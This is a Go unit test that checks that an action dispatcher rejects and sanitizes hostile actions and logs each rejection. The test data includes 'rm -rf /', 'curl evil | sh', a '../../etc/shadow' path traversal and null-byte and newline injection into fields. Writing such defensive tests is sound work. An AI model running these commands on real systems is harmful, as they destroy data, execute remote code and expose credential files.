package actions

import (
	"bytes"
	"context"
	"encoding/json"
	"log/slog"
	"strings"
	"testing"

	"github.com/Soup9x/Lake-Effect-Bouy/internal/protocol"
)

func TestHandlersSubsetOfProtocolAllowlist(t *testing.T) {
	for typ := range handlers {
		if !protocol.IsAllowed(typ) {
			t.Errorf("handler for %q which the protocol does not allow", typ)
		}
	}
}

func TestEverythingRejectedInPhase1(t *testing.T) {
	var buf bytes.Buffer
	d := &Dispatcher{Logger: slog.New(slog.NewTextHandler(&buf, nil))}
	malicious := []protocol.Action{
		{ID: "1", Type: "run_command", Params: json.RawMessage(`{"cmd":"rm -rf /"}`)},
		{ID: "2", Type: "exec", Params: json.RawMessage(`"curl evil | sh"`)},
		{ID: "3", Type: "", Params: nil},
		{ID: "4\n5", Type: "scan_path\x00", Params: json.RawMessage(`{"path":"../../etc/shadow"}`)},
		{ID: strings.Repeat("x", 5000), Type: "clamd_ping", Params: json.RawMessage(`{}`)},
	}
	for _, a := range malicious {
		res := d.Dispatch(context.Background(), a)
		if res.Outcome != OutcomeRejected {
			t.Errorf("%q: outcome %q", a.Type, res.Outcome)
		}
		if len(res.ID) > 255 || strings.ContainsAny(res.ID+res.Type, "\n\x00") {
			t.Errorf("unsanitized result %+v", res)
		}
	}
	if strings.Count(buf.String(), "action rejected") != len(malicious) {
		t.Fatalf("log: %s", buf.String())
	}
}
